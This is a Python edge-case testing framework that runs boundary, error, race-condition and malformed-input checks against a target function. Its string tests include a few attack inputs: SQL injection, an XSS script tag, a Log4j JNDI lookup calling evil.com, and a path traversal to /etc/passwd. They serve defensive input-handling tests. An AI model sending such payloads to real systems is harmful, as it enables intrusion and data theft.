"""
Comprehensive Edge Case Testing Framework for Phase 4.2

Implements systematic edge case testing including:
- Boundary value testing with extreme inputs
- Error condition simulation and validation
- Resource constraint testing (memory, disk, network)
- Race condition and concurrency edge cases
- Data corruption and recovery scenarios
- Malformed input handling and sanitization
"""

import asyncio
import logging
import time
import random
import string
import json
import tempfile
import os
import threading
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Union, Callable
from dataclasses import dataclass, asdict
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor
import statistics
import uuid
import weakref

logger = logging.getLogger(__name__)


@dataclass
class EdgeCaseConfig:
    """Configuration for edge case testing."""
    
    # Test categories to run
    test_boundary_values: bool = True
    test_error_conditions: bool = True
    test_resource_constraints: bool = True
    test_race_conditions: bool = True
    test_data_corruption: bool = True
    test_malformed_inputs: bool = True
    
    # Boundary testing parameters
    max_string_length: int = 100000
    max_list_size: int = 10000
    max_numeric_value: int = 2**63 - 1
    min_numeric_value: int = -(2**63)
    
    # Resource constraint parameters
    max_memory_mb: int = 100
    max_file_size_mb: int = 50
    max_concurrent_operations: int = 1000
    
    # Race condition parameters
    race_condition_iterations: int = 100
    race_condition_threads: int = 10
    
    # Error simulation parameters
    error_injection_rate: float = 0.1  # 10% chance
    network_failure_rate: float = 0.05  # 5% chance
    
    # Timeout settings
    default_timeout_seconds: float = 30.0
    long_operation_timeout_seconds: float = 300.0


@dataclass
class EdgeCaseResult:
    """Result of an edge case test."""
    
    test_id: str
    test_name: str
    test_category: str
    timestamp: str
    
    # Test parameters
    input_data: Dict[str, Any]
    expected_behavior: str
    
    # Results
    status: str = "pending"  # pending, passed, failed, error, timeout
    actual_result: Any = None
    error_message: Optional[str] = None
    exception_type: Optional[str] = None
    
    # Performance metrics
    execution_time_ms: float = 0.0
    memory_usage_mb: float = 0.0
    cpu_usage_percent: float = 0.0
    
    # Validation
    validation_passed: bool = False
    validation_details: List[str] = None
    
    def __post_init__(self):
        if self.validation_details is None:
            self.validation_details = []
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class EdgeCaseTestSuite:
    """Complete edge case test suite results."""
    
    suite_id: str
    timestamp: str
    duration_minutes: float
    
    # Configuration
    config: EdgeCaseConfig
    categories_tested: List[str]
    
    # Results summary
    total_tests: int = 0
    tests_passed: int = 0
    tests_failed: int = 0
    tests_error: int = 0
    tests_timeout: int = 0
    
    # Detailed results
    test_results: List[EdgeCaseResult] = None
    
    # Analysis
    critical_failures: List[str] = None
    edge_cases_found: List[str] = None
    recommendations: List[str] = None
    
    def __post_init__(self):
        if self.test_results is None:
            self.test_results = []
        if self.critical_failures is None:
            self.critical_failures = []
        if self.edge_cases_found is None:
            self.edge_cases_found = []
        if self.recommendations is None:
            self.recommendations = []
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            **asdict(self),
            'config': asdict(self.config),
            'test_results': [r.to_dict() for r in self.test_results]
        }


class BoundaryValueTester:
    """Tests boundary values and extreme inputs."""
    
    def __init__(self, config: EdgeCaseConfig):
        self.config = config
        self.logger = logging.getLogger(__name__ + ".BoundaryValueTester")
    
    async def run_boundary_tests(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Run comprehensive boundary value tests."""
        
        self.logger.info("Running boundary value tests")
        
        results = []
        
        # String boundary tests
        string_tests = await self._test_string_boundaries(target_function)
        results.extend(string_tests)
        
        # Numeric boundary tests
        numeric_tests = await self._test_numeric_boundaries(target_function)
        results.extend(numeric_tests)
        
        # Collection boundary tests
        collection_tests = await self._test_collection_boundaries(target_function)
        results.extend(collection_tests)
        
        # Special value tests
        special_tests = await self._test_special_values(target_function)
        results.extend(special_tests)
        
        return results
    
    async def _test_string_boundaries(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test string boundary conditions."""
        
        test_cases = [
            # Empty and minimal strings
            ("", "empty_string"),
            (" ", "single_space"),
            ("a", "single_character"),
            
            # Very long strings
            ("a" * 1000, "long_string_1k"),
            ("a" * 10000, "long_string_10k"),
            ("a" * self.config.max_string_length, "max_length_string"),
            
            # Special characters
            ("\\n\\r\\t", "control_characters"),
            ("unicode: 🚀🔍📊", "unicode_characters"),
            ("null\\0byte", "null_byte"),
            ("'\"\\`", "quote_characters"),
            
            # Potential injection patterns
            ("'; DROP TABLE users; --", "sql_injection_pattern"),
            ("<script>alert('xss')</script>", "xss_pattern"),
            ("${jndi:ldap://evil.com/a}", "log4j_pattern"),
            ("../../../etc/passwd", "path_traversal_pattern"),
        ]
        
        results = []
        
        for test_input, test_name in test_cases:
            result = await self._run_single_test(
                test_id=f"boundary_string_{test_name}",
                test_name=f"String boundary: {test_name}",
                test_category="boundary_values",
                target_function=target_function,
                input_data={"query": test_input},
                expected_behavior="graceful_handling"
            )
            results.append(result)
        
        return results
    
    async def _test_numeric_boundaries(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test numeric boundary conditions."""
        
        test_cases = [
            # Zero and small numbers
            (0, "zero"),
            (1, "one"),
            (-1, "negative_one"),
            
            # Large numbers
            (2**31 - 1, "max_int32"),
            (2**31, "int32_overflow"),
            (2**63 - 1, "max_int64"),
            
            # Floating point edge cases
            (float('inf'), "positive_infinity"),
            (float('-inf'), "negative_infinity"),
            (float('nan'), "not_a_number"),
            (1e308, "very_large_float"),
            (1e-308, "very_small_float"),
        ]
        
        results = []
        
        for test_input, test_name in test_cases:
            result = await self._run_single_test(
                test_id=f"boundary_numeric_{test_name}",
                test_name=f"Numeric boundary: {test_name}",
                test_category="boundary_values",
                target_function=target_function,
                input_data={"limit": test_input} if isinstance(test_input, int) else {"score": test_input},
                expected_behavior="graceful_handling"
            )
            results.append(result)
        
        return results
    
    async def _test_collection_boundaries(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test collection boundary conditions."""
        
        test_cases = [
            # Empty collections
            ([], "empty_list"),
            ({}, "empty_dict"),
            (set(), "empty_set"),
            
            # Large collections
            (list(range(1000)), "large_list_1k"),
            (list(range(10000)), "large_list_10k"),
            ({f"key_{i}": f"value_{i}" for i in range(1000)}, "large_dict_1k"),
            
            # Nested collections
            ([[[]]], "deeply_nested_lists"),
            ({"a": {"b": {"c": {"d": "deep"}}}}, "deeply_nested_dict"),
        ]
        
        results = []
        
        for test_input, test_name in test_cases:
            result = await self._run_single_test(
                test_id=f"boundary_collection_{test_name}",
                test_name=f"Collection boundary: {test_name}",
                test_category="boundary_values",
                target_function=target_function,
                input_data={"collection": test_input},
                expected_behavior="graceful_handling"
            )
            results.append(result)
        
        return results
    
    async def _test_special_values(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test special values and edge cases."""
        
        test_cases = [
            # None values
            (None, "none_value"),
            ([None, None], "list_with_nones"),
            ({"key": None}, "dict_with_none"),
            
            # Mixed types
            ([1, "string", None, {}], "mixed_types_list"),
            ({"int": 1, "str": "text", "none": None}, "mixed_types_dict"),
        ]
        
        results = []
        
        for test_input, test_name in test_cases:
            result = await self._run_single_test(
                test_id=f"boundary_special_{test_name}",
                test_name=f"Special value: {test_name}",
                test_category="boundary_values",
                target_function=target_function,
                input_data={"special": test_input},
                expected_behavior="graceful_handling"
            )
            results.append(result)
        
        return results
    
    async def _run_single_test(
        self, 
        test_id: str,
        test_name: str,
        test_category: str,
        target_function: Callable,
        input_data: Dict[str, Any],
        expected_behavior: str
    ) -> EdgeCaseResult:
        """Run a single boundary test."""
        
        result = EdgeCaseResult(
            test_id=test_id,
            test_name=test_name,
            test_category=test_category,
            timestamp=datetime.now().isoformat(),
            input_data=input_data,
            expected_behavior=expected_behavior
        )
        
        start_time = time.time()
        
        try:
            # Execute test with timeout
            actual_result = await asyncio.wait_for(
                target_function(**input_data),
                timeout=self.config.default_timeout_seconds
            )
            
            result.actual_result = actual_result
            result.status = "passed"
            result.validation_passed = True
            result.validation_details.append("Function executed without exceptions")
            
        except asyncio.TimeoutError:
            result.status = "timeout"
            result.error_message = f"Test timed out after {self.config.default_timeout_seconds}s"
            
        except Exception as e:
            result.status = "error"
            result.error_message = str(e)
            result.exception_type = type(e).__name__
            
            # Check if error is expected/graceful
            if self._is_graceful_error(e):
                result.validation_passed = True
                result.validation_details.append("Graceful error handling detected")
            else:
                result.validation_details.append(f"Unexpected error: {str(e)}")
        
        result.execution_time_ms = (time.time() - start_time) * 1000
        
        return result
    
    def _is_graceful_error(self, exception: Exception) -> bool:
        """Check if an error represents graceful handling."""
        
        graceful_errors = [
            ValueError, TypeError, AttributeError, 
            KeyError, IndexError, AssertionError
        ]
        
        return any(isinstance(exception, error_type) for error_type in graceful_errors)


class ErrorConditionTester:
    """Tests error conditions and exception handling."""
    
    def __init__(self, config: EdgeCaseConfig):
        self.config = config
        self.logger = logging.getLogger(__name__ + ".ErrorConditionTester")
    
    async def run_error_tests(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Run comprehensive error condition tests."""
        
        self.logger.info("Running error condition tests")
        
        results = []
        
        # Network error simulation
        network_tests = await self._test_network_errors(target_function)
        results.extend(network_tests)
        
        # Resource exhaustion tests
        resource_tests = await self._test_resource_exhaustion(target_function)
        results.extend(resource_tests)
        
        # Invalid state tests
        state_tests = await self._test_invalid_states(target_function)
        results.extend(state_tests)
        
        return results
    
    async def _test_network_errors(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test network error conditions."""
        
        # Mock network errors by injecting failures
        error_scenarios = [
            ("connection_timeout", "Simulated connection timeout"),
            ("connection_refused", "Simulated connection refused"),
            ("dns_resolution_failed", "Simulated DNS failure"),
            ("network_unreachable", "Simulated network unreachable"),
        ]
        
        results = []
        
        for error_type, description in error_scenarios:
            result = EdgeCaseResult(
                test_id=f"error_network_{error_type}",
                test_name=f"Network error: {error_type}",
                test_category="error_conditions",
                timestamp=datetime.now().isoformat(),
                input_data={"error_simulation": error_type},
                expected_behavior="graceful_error_handling"
            )
            
            start_time = time.time()
            
            try:
                # Simulate network error by randomly failing
                if random.random() < self.config.network_failure_rate:
                    raise ConnectionError(description)
                
                actual_result = await target_function(query="test network")
                result.actual_result = actual_result
                result.status = "passed"
                result.validation_passed = True
                
            except Exception as e:
                result.status = "error"
                result.error_message = str(e)
                result.exception_type = type(e).__name__
                
                # Network errors should be handled gracefully
                if isinstance(e, (ConnectionError, OSError)):
                    result.validation_passed = True
                    result.validation_details.append("Network error handled gracefully")
                else:
                    result.validation_details.append("Unexpected error type")
            
            result.execution_time_ms = (time.time() - start_time) * 1000
            results.append(result)
        
        return results
    
    async def _test_resource_exhaustion(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test resource exhaustion scenarios."""
        
        results = []
        
        # Memory exhaustion test
        memory_test = EdgeCaseResult(
            test_id="error_memory_exhaustion",
            test_name="Memory exhaustion test",
            test_category="error_conditions",
            timestamp=datetime.now().isoformat(),
            input_data={"large_data": True},
            expected_behavior="memory_error_handling"
        )
        
        start_time = time.time()
        
        try:
            # Create large data structure to simulate memory pressure
            large_data = ["x" * 1000000] * 100  # 100MB of data
            result = await target_function(data=large_data[:10])  # Only use small portion
            
            memory_test.actual_result = result
            memory_test.status = "passed"
            memory_test.validation_passed = True
            
        except MemoryError:
            memory_test.status = "error"
            memory_test.error_message = "Memory error (expected)"
            memory_test.validation_passed = True
            memory_test.validation_details.append("Memory error handled correctly")
            
        except Exception as e:
            memory_test.status = "error"
            memory_test.error_message = str(e)
            memory_test.exception_type = type(e).__name__
        
        memory_test.execution_time_ms = (time.time() - start_time) * 1000
        results.append(memory_test)
        
        return results
    
    async def _test_invalid_states(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test invalid state conditions."""
        
        invalid_states = [
            ("uninitialized", {"initialized": False}),
            ("corrupted_data", {"data_corrupted": True}),
            ("locked_resource", {"resource_locked": True}),
        ]
        
        results = []
        
        for state_name, state_params in invalid_states:
            result = EdgeCaseResult(
                test_id=f"error_invalid_state_{state_name}",
                test_name=f"Invalid state: {state_name}",
                test_category="error_conditions",
                timestamp=datetime.now().isoformat(),
                input_data=state_params,
                expected_behavior="state_validation"
            )
            
            start_time = time.time()
            
            try:
                actual_result = await target_function(**state_params)
                result.actual_result = actual_result
                result.status = "passed"
                result.validation_passed = True
                
            except Exception as e:
                result.status = "error"
                result.error_message = str(e)
                result.exception_type = type(e).__name__
                
                # State validation errors are expected
                if isinstance(e, (ValueError, RuntimeError, AssertionError)):
                    result.validation_passed = True
                    result.validation_details.append("Invalid state properly detected")
            
            result.execution_time_ms = (time.time() - start_time) * 1000
            results.append(result)
        
        return results


class RaceConditionTester:
    """Tests race conditions and concurrency issues."""
    
    def __init__(self, config: EdgeCaseConfig):
        self.config = config
        self.logger = logging.getLogger(__name__ + ".RaceConditionTester")
        self.shared_state = {}
        self.race_results = []
    
    async def run_race_condition_tests(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Run race condition tests."""
        
        self.logger.info("Running race condition tests")
        
        results = []
        
        # Concurrent access test
        concurrent_test = await self._test_concurrent_access(target_function)
        results.append(concurrent_test)
        
        # Shared resource test
        shared_resource_test = await self._test_shared_resource_access(target_function)
        results.append(shared_resource_test)
        
        # State modification race test
        state_race_test = await self._test_state_modification_races(target_function)
        results.append(state_race_test)
        
        return results
    
    async def _test_concurrent_access(self, target_function: Callable) -> EdgeCaseResult:
        """Test concurrent access patterns."""
        
        result = EdgeCaseResult(
            test_id="race_concurrent_access",
            test_name="Concurrent access race condition",
            test_category="race_conditions",
            timestamp=datetime.now().isoformat(),
            input_data={"concurrent_threads": self.config.race_condition_threads},
            expected_behavior="thread_safety"
        )
        
        start_time = time.time()
        
        try:
            # Create multiple concurrent tasks
            tasks = []
            for i in range(self.config.race_condition_threads):
                task = asyncio.create_task(
                    self._concurrent_worker(target_function, i)
                )
                tasks.append(task)
            
            # Wait for all tasks to complete
            worker_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Analyze results
            successful_results = [r for r in worker_results if not isinstance(r, Exception)]
            failed_results = [r for r in worker_results if isinstance(r, Exception)]
            
            result.actual_result = {
                "successful_operations": len(successful_results),
                "failed_operations": len(failed_results),
                "total_operations": len(worker_results)
            }
            
            # Check for race condition indicators
            if len(failed_results) == 0:
                result.status = "passed"
                result.validation_passed = True
                result.validation_details.append("No race conditions detected")
            elif len(failed_results) < len(worker_results) * 0.1:  # Less than 10% failures
                result.status = "passed"
                result.validation_passed = True
                result.validation_details.append("Minor race condition effects within tolerance")
            else:
                result.status = "failed"
                result.validation_details.append(f"High failure rate: {len(failed_results)}/{len(worker_results)}")
        
        except Exception as e:
            result.status = "error"
            result.error_message = str(e)
            result.exception_type = type(e).__name__
        
        result.execution_time_ms = (time.time() - start_time) * 1000
        
        return result
    
    async def _concurrent_worker(self, target_function: Callable, worker_id: int) -> Any:
        """Worker function for concurrent testing."""
        
        try:
            # Add some randomness to increase chance of race conditions
            await asyncio.sleep(random.uniform(0, 0.01))
            
            result = await target_function(query=f"worker_{worker_id}_query")
            
            # Update shared state
            self.shared_state[f"worker_{worker_id}"] = result
            
            return result
        
        except Exception as e:
            self.race_results.append(f"Worker {worker_id} failed: {str(e)}")
            raise
    
    async def _test_shared_resource_access(self, target_function: Callable) -> EdgeCaseResult:
        """Test shared resource access patterns."""
        
        result = EdgeCaseResult(
            test_id="race_shared_resource",
            test_name="Shared resource race condition",
            test_category="race_conditions",
            timestamp=datetime.now().isoformat(),
            input_data={"shared_resource": True},
            expected_behavior="resource_synchronization"
        )
        
        start_time = time.time()
        shared_counter = {"value": 0}
        
        async def increment_counter():
            for _ in range(100):
                # Simulate race condition in counter increment
                current = shared_counter["value"]
                await asyncio.sleep(0.0001)  # Small delay to encourage race
                shared_counter["value"] = current + 1
        
        try:
            # Run multiple counter incrementers concurrently
            tasks = [increment_counter() for _ in range(5)]
            await asyncio.gather(*tasks)
            
            expected_value = 5 * 100  # 5 tasks * 100 increments each
            actual_value = shared_counter["value"]
            
            result.actual_result = {
                "expected_value": expected_value,
                "actual_value": actual_value,
                "race_condition_detected": actual_value < expected_value
            }
            
            if actual_value == expected_value:
                result.status = "passed"
                result.validation_passed = True
                result.validation_details.append("No race condition in shared resource access")
            else:
                result.status = "failed"
                result.validation_details.append(
                    f"Race condition detected: expected {expected_value}, got {actual_value}"
                )
        
        except Exception as e:
            result.status = "error"
            result.error_message = str(e)
            result.exception_type = type(e).__name__
        
        result.execution_time_ms = (time.time() - start_time) * 1000
        
        return result
    
    async def _test_state_modification_races(self, target_function: Callable) -> EdgeCaseResult:
        """Test state modification race conditions."""
        
        result = EdgeCaseResult(
            test_id="race_state_modification",
            test_name="State modification race condition",
            test_category="race_conditions",
            timestamp=datetime.now().isoformat(),
            input_data={"state_modifications": True},
            expected_behavior="state_consistency"
        )
        
        start_time = time.time()
        
        try:
            # Simulate concurrent state modifications
            state_dict = {"items": []}
            
            async def add_items(start_id: int, count: int):
                for i in range(count):
                    await asyncio.sleep(0.001)  # Simulate some processing
                    state_dict["items"].append(f"item_{start_id}_{i}")
            
            # Run multiple state modifiers
            tasks = [
                add_items(0, 50),
                add_items(100, 50),
                add_items(200, 50)
            ]
            
            await asyncio.gather(*tasks)
            
            result.actual_result = {
                "total_items": len(state_dict["items"]),
                "expected_items": 150,
                "unique_items": len(set(state_dict["items"])),
                "state_consistency": len(state_dict["items"]) == len(set(state_dict["items"]))
            }
            
            if len(state_dict["items"]) == 150 and len(set(state_dict["items"])) == 150:
                result.status = "passed"
                result.validation_passed = True
                result.validation_details.append("State modifications are consistent")
            else:
                result.status = "failed"
                result.validation_details.append("State inconsistency detected")
        
        except Exception as e:
            result.status = "error"
            result.error_message = str(e)
            result.exception_type = type(e).__name__
        
        result.execution_time_ms = (time.time() - start_time) * 1000
        
        return result


class MalformedInputTester:
    """Tests malformed and invalid input handling."""
    
    def __init__(self, config: EdgeCaseConfig):
        self.config = config
        self.logger = logging.getLogger(__name__ + ".MalformedInputTester")
    
    async def run_malformed_input_tests(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Run malformed input tests."""
        
        self.logger.info("Running malformed input tests")
        
        results = []
        
        # Invalid JSON tests
        json_tests = await self._test_invalid_json(target_function)
        results.extend(json_tests)
        
        # Invalid encoding tests
        encoding_tests = await self._test_invalid_encoding(target_function)
        results.extend(encoding_tests)
        
        # Protocol violation tests
        protocol_tests = await self._test_protocol_violations(target_function)
        results.extend(protocol_tests)
        
        return results
    
    async def _test_invalid_json(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test invalid JSON input handling."""
        
        invalid_json_cases = [
            ('{"invalid": json}', "missing_quotes"),
            ('{"unclosed": "string}', "unclosed_string"),
            ('{"trailing": "comma",}', "trailing_comma"),
            ('{invalid: "key"}', "unquoted_key"),
            ('{"nested": {"broken": }', "broken_nesting"),
            ('null', "null_json"),
            ('', "empty_json"),
        ]
        
        results = []
        
        for invalid_json, test_name in invalid_json_cases:
            result = EdgeCaseResult(
                test_id=f"malformed_json_{test_name}",
                test_name=f"Invalid JSON: {test_name}",
                test_category="malformed_inputs",
                timestamp=datetime.now().isoformat(),
                input_data={"json_data": invalid_json},
                expected_behavior="json_validation"
            )
            
            start_time = time.time()
            
            try:
                # Try to process invalid JSON
                actual_result = await target_function(json_input=invalid_json)
                result.actual_result = actual_result
                result.status = "failed"
                result.validation_details.append("Invalid JSON was accepted (should be rejected)")
                
            except (json.JSONDecodeError, ValueError) as e:
                result.status = "passed"
                result.validation_passed = True
                result.validation_details.append("Invalid JSON properly rejected")
                result.error_message = str(e)
                
            except Exception as e:
                result.status = "error"
                result.error_message = str(e)
                result.exception_type = type(e).__name__
            
            result.execution_time_ms = (time.time() - start_time) * 1000
            results.append(result)
        
        return results
    
    async def _test_invalid_encoding(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test invalid encoding handling."""
        
        encoding_cases = [
            (b'\\xff\\xfe\\x00\\x00', "invalid_utf8"),
            (b'\\x80\\x81\\x82\\x83', "invalid_bytes"),
            ("valid text with \\x00 null byte", "null_byte_in_string"),
            ("mixed \\u0000 unicode \\uffff", "extreme_unicode"),
        ]
        
        results = []
        
        for test_input, test_name in encoding_cases:
            result = EdgeCaseResult(
                test_id=f"malformed_encoding_{test_name}",
                test_name=f"Invalid encoding: {test_name}",
                test_category="malformed_inputs",
                timestamp=datetime.now().isoformat(),
                input_data={"encoded_data": str(test_input)},
                expected_behavior="encoding_validation"
            )
            
            start_time = time.time()
            
            try:
                if isinstance(test_input, bytes):
                    # Try to decode bytes
                    decoded = test_input.decode('utf-8')
                    actual_result = await target_function(query=decoded)
                else:
                    actual_result = await target_function(query=test_input)
                
                result.actual_result = actual_result
                result.status = "passed"
                result.validation_passed = True
                
            except UnicodeDecodeError as e:
                result.status = "passed"
                result.validation_passed = True
                result.validation_details.append("Invalid encoding properly detected")
                result.error_message = str(e)
                
            except Exception as e:
                result.status = "error"
                result.error_message = str(e)
                result.exception_type = type(e).__name__
            
            result.execution_time_ms = (time.time() - start_time) * 1000
            results.append(result)
        
        return results
    
    async def _test_protocol_violations(self, target_function: Callable) -> List[EdgeCaseResult]:
        """Test protocol violation handling."""
        
        protocol_violations = [
            ({"missing_required_field": True}, "missing_required_field"),
            ({"invalid_field_type": "should_be_int"}, "wrong_field_type"),
            ({"extra_unexpected_field": "not_in_schema"}, "extra_field"),
            ({"negative_size": -1}, "negative_numeric_value"),
        ]
        
        results = []
        
        for violation_data, test_name in protocol_violations:
            result = EdgeCaseResult(
                test_id=f"malformed_protocol_{test_name}",
                test_name=f"Protocol violation: {test_name}",
                test_category="malformed_inputs",
                timestamp=datetime.now().isoformat(),
                input_data=violation_data,
                expected_behavior="protocol_validation"
            )
            
            start_time = time.time()
            
            try:
                actual_result = await target_function(**violation_data)
                result.actual_result = actual_result
                result.status = "failed"
                result.validation_details.append("Protocol violation was accepted")
                
            except (ValueError, TypeError, KeyError) as e:
                result.status = "passed"
                result.validation_passed = True
                result.validation_details.append("Protocol violation properly detected")
                result.error_message = str(e)
                
            except Exception as e:
                result.status = "error"
                result.error_message = str(e)
                result.exception_type = type(e).__name__
            
            result.execution_time_ms = (time.time() - start_time) * 1000
            results.append(result)
        
        return results


class EdgeCaseTester:
    """Main edge case testing framework."""
    
    def __init__(self, config: Optional[EdgeCaseConfig] = None):
        """Initialize edge case tester."""
        
        self.config = config or EdgeCaseConfig()
        
        # Initialize specialized testers
        self.boundary_tester = BoundaryValueTester(self.config)
        self.error_tester = ErrorConditionTester(self.config)
        self.race_tester = RaceConditionTester(self.config)
        self.malformed_tester = MalformedInputTester(self.config)
        
        self.logger = logging.getLogger(__name__ + ".EdgeCaseTester")
    
    async def run_comprehensive_edge_case_tests(
        self, 
        target_function: Callable,
        test_name: str = "comprehensive_edge_case_test"
    ) -> EdgeCaseTestSuite:
        """
        Run comprehensive edge case test suite.
        
        Args:
            target_function: Function to test
            test_name: Name for this test suite
            
        Returns:
            Complete test suite results
        """
        
        self.logger.info(f"Starting comprehensive edge case testing: {test_name}")
        
        suite_id = f"edge_case_suite_{test_name}_{int(time.time())}"
        start_time = time.time()
        
        all_results = []
        categories_tested = []
        
        try:
            # Run boundary value tests
            if self.config.test_boundary_values:
                self.logger.info("Running boundary value tests...")
                boundary_results = await self.boundary_tester.run_boundary_tests(target_function)
                all_results.extend(boundary_results)
                categories_tested.append("boundary_values")
            
            # Run error condition tests
            if self.config.test_error_conditions:
                self.logger.info("Running error condition tests...")
                error_results = await self.error_tester.run_error_tests(target_function)
                all_results.extend(error_results)
                categories_tested.append("error_conditions")
            
            # Run race condition tests
            if self.config.test_race_conditions:
                self.logger.info("Running race condition tests...")
                race_results = await self.race_tester.run_race_condition_tests(target_function)
                all_results.extend(race_results)
                categories_tested.append("race_conditions")
            
            # Run malformed input tests
            if self.config.test_malformed_inputs:
                self.logger.info("Running malformed input tests...")
                malformed_results = await self.malformed_tester.run_malformed_input_tests(target_function)
                all_results.extend(malformed_results)
                categories_tested.append("malformed_inputs")
            
            # Analyze results
            duration = (time.time() - start_time) / 60
            
            suite = EdgeCaseTestSuite(
                suite_id=suite_id,
                timestamp=datetime.now().isoformat(),
                duration_minutes=duration,
                config=self.config,
                categories_tested=categories_tested,
                test_results=all_results
            )
            
            # Calculate summary statistics
            suite.total_tests = len(all_results)
            suite.tests_passed = len([r for r in all_results if r.status == "passed"])
            suite.tests_failed = len([r for r in all_results if r.status == "failed"])
            suite.tests_error = len([r for r in all_results if r.status == "error"])
            suite.tests_timeout = len([r for r in all_results if r.status == "timeout"])
            
            # Identify critical failures and edge cases
            suite.critical_failures = self._identify_critical_failures(all_results)
            suite.edge_cases_found = self._identify_edge_cases(all_results)
            suite.recommendations = self._generate_recommendations(all_results)
            
            self.logger.info("Edge case testing completed")
            self.logger.info(f"  Total tests: {suite.total_tests}")
            self.logger.info(f"  Passed: {suite.tests_passed}")
            self.logger.info(f"  Failed: {suite.tests_failed}")
            self.logger.info(f"  Errors: {suite.tests_error}")
            self.logger.info(f"  Timeouts: {suite.tests_timeout}")
            
            return suite
        
        except Exception as e:
            self.logger.error(f"Edge case testing failed: {e}")
            raise
    
    def _identify_critical_failures(self, results: List[EdgeCaseResult]) -> List[str]:
        """Identify critical failures that need immediate attention."""
        
        critical_failures = []
        
        # Unhandled exceptions in basic operations
        basic_failures = [r for r in results if 
                         r.status == "error" and 
                         r.test_category == "boundary_values" and
                         not r.validation_passed]
        
        if basic_failures:
            critical_failures.append(f"Unhandled exceptions in basic operations: {len(basic_failures)} tests")
        
        # Security-related failures
        security_failures = [r for r in results if 
                           "injection" in r.test_name.lower() and 
                           r.status == "passed" and 
                           "injection_pattern" in str(r.input_data)]
        
        if security_failures:
            critical_failures.append(f"Potential security vulnerabilities: {len(security_failures)} tests")
        
        # Race condition failures
        race_failures = [r for r in results if 
                        r.test_category == "race_conditions" and 
                        r.status == "failed"]
        
        if race_failures:
            critical_failures.append(f"Race condition issues detected: {len(race_failures)} tests")
        
        return critical_failures
    
    def _identify_edge_cases(self, results: List[EdgeCaseResult]) -> List[str]:
        """Identify interesting edge cases discovered during testing."""
        
        edge_cases = []
        
        # Timeout edge cases
        timeout_cases = [r for r in results if r.status == "timeout"]
        if timeout_cases:
            edge_cases.append(f"Timeout edge cases: {len(timeout_cases)} tests exceeded time limits")
        
        # Graceful error handling
        graceful_errors = [r for r in results if 
                          r.status == "error" and 
                          r.validation_passed]
        if graceful_errors:
            edge_cases.append(f"Graceful error handling: {len(graceful_errors)} error cases handled properly")
        
        # Performance edge cases
        slow_tests = [r for r in results if r.execution_time_ms > 5000]  # > 5 seconds
        if slow_tests:
            edge_cases.append(f"Performance edge cases: {len(slow_tests)} tests took >5 seconds")
        
        return edge_cases
    
    def _generate_recommendations(self, results: List[EdgeCaseResult]) -> List[str]:
        """Generate recommendations based on test results."""
        
        recommendations = []
        
        # Error handling recommendations
        unhandled_errors = len([r for r in results if r.status == "error" and not r.validation_passed])
        if unhandled_errors > 0:
            recommendations.append(f"Improve error handling for {unhandled_errors} edge cases")
        
        # Performance recommendations
        slow_tests = len([r for r in results if r.execution_time_ms > 1000])
        if slow_tests > len(results) * 0.1:  # More than 10% of tests are slow
            recommendations.append("Consider performance optimization for edge case handling")
        
        # Input validation recommendations
        malformed_accepted = len([r for r in results if 
                                 r.test_category == "malformed_inputs" and 
                                 r.status == "passed" and 
                                 not r.validation_passed])
        if malformed_accepted > 0:
            recommendations.append(f"Strengthen input validation for {malformed_accepted} malformed input cases")
        
        # Concurrency recommendations
        race_issues = len([r for r in results if 
                          r.test_category == "race_conditions" and 
                          r.status == "failed"])
        if race_issues > 0:
            recommendations.append("Review synchronization mechanisms for concurrent operations")
        
        return recommendations


# Convenience functions

async def run_edge_case_test_suite(
    target_function: Callable,
    test_name: str = "edge_case_suite",
    config: Optional[EdgeCaseConfig] = None
) -> EdgeCaseTestSuite:
    """Run comprehensive edge case test suite."""
    
    tester = EdgeCaseTester(config)
    return await tester.run_comprehensive_edge_case_tests(target_function, test_name)


def create_strict_edge_case_config() -> EdgeCaseConfig:
    """Create strict configuration for thorough edge case testing."""
    
    return EdgeCaseConfig(
        max_string_length=1000000,
        max_list_size=50000,
        race_condition_iterations=200,
        race_condition_threads=20,
        error_injection_rate=0.2,
        network_failure_rate=0.1,
        default_timeout_seconds=60.0
    )